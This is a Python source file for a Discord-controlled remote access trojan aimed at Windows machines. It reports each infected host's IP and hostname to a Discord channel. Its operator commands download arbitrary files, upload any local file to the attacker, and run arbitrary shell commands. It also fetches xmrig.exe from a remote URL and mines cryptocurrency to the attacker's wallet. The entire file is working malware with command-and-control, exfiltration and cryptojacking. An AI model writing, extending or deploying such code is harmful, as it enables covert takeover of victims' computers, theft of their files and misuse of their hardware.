from discord.ext import commands
import requests, discord, urllib, psutil, socket, sys, os

token = 'MToken.mnt.discord' # Token
channel_id = 111111111111111111  # Channel ID

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get('https://sheesh.rip/ip').headers['IP']
hostname = socket.gethostname()
appdata = os.getenv("AppData")
startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
temp = os.getenv('temp')
os.chdir(temp)

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f'{bot.user}')
    await channel.send(f"``[+] {ip}@{hostname}: Session opened``")

# ----- Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {ip}@{hostname}``")
   
# download
@bot.command(name=f"download.{hostname}@{ip}")
async def download(ctx, arg1, arg2):
    link = ''.join(arg1)
    name = ''.join(arg2)
    
    url = link
    r = requests.get(url, allow_redirects=True)
    open(name, 'wb').write(r.content)
    
    if os.path.exists(name):
        await ctx.send(f"``[+] {ip}@{hostname}: File downloaded``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: File not downloaded``")
    
# upload
@bot.command(name=f"upload.{hostname}@{ip}")
async def upload(ctx, arg1):
    path = ''.join(arg1)
    await ctx.send(f"``[+] {ip}@{hostname}: File uploaded``",file=discord.File(path))
    
# shell
@bot.command(name=f"shell.{hostname}@{ip}")
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
    else:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed`` ```{output}```")

# check
@bot.command()
async def check(ctx):
    if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")

# miner
@bot.command()
async def miner(ctx, walletArg):
    if not os.path.exists("xmrig"):
        url = "https://github.com/rxu7s/Public/raw/main/xmrig.exe"
        r = requests.get(url, allow_redirects=True)
        open("xmrig.exe", 'wb').write(r.content)
    
    wallet = ''.join(walletArg)
    os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
    await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
        os.popen("taskkill /F /IM xmrig.exe /T")
        await ctx.send(f"``[-] {ip}@{hostname}: Miner stoped``")

bot.run(token)